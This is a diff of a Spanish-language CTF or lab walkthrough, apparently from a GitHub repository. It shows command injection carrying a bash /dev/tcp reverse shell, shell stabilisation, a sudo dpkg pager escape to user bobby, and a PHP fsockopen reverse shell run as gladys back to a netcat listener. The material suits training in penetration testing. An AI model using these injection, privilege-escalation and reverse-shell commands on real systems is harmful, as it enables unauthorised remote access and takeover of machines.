@@ -34,7 +34,7 @@ Iremos a preparar una revershell, usaremos && y despues la revshell
 <img width="1185" height="659" alt="image" src="https://github.com/user-attachments/assets/e5269586-47ca-486c-9866-da930c69658f" />
 
 ```ruby
-localhost && bash -c 'exec 5<>/dev/tcp/10.0.2.15/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
+localhost && bash -c 'exec 5<>/dev/tcp/ip/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
 ```
 
 ya tendriamos la conexion con esto:
@@ -44,3 +44,41 @@ ya tendriamos la conexion con esto:
 # Acceso a maquina 
 
 Aremos un tratamiento de la terminal, para no tener problas de ejecuciones 
+
+```ruby
+script /dev/null -c bash 
+CTRL + Z 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+```
+
+Aremos un sudo -l, podemos ver que podremos ejecutar con el usuario Bobby el comando dpkg
+
+<img width="1154" height="374" alt="image" src="https://github.com/user-attachments/assets/9bec57db-b3f8-4c8c-8e21-710d722e67bb" />
+
+usando el comando y nos conectamos como bobby
+
+<img width="1073" height="111" alt="image" src="https://github.com/user-attachments/assets/c1e3bb3d-bebd-4e24-b73c-61ff81a275f6" />
+
+```ruby
+sudo -u bobby /usr/bin/dpkg -l
+!/bin/bash
+```
+ahora como el usuario gladys podemos ejecutar php
+
+<img width="1040" height="102" alt="image" src="https://github.com/user-attachments/assets/9155eecb-80e0-4630-b018-985438f43a8a" />
+
+nos podnremos ala escucha y mandremos un revshell de la maquina victima ala nuestra
+
+```rubby
+nc -lvpn 9002
+sudo -u gladys /usr/bin/php -r '$sock=fsockopen("ip",9002);exec("bash <&3 >&3 2>&3");'
+```
+
+comprovamos que ya tenemos la conexion con gladys
+
+<img width="832" height="148" alt="image" src="https://github.com/user-attachments/assets/f7c6e505-1a26-4ff0-9b7f-813afe8a52bd" />
+
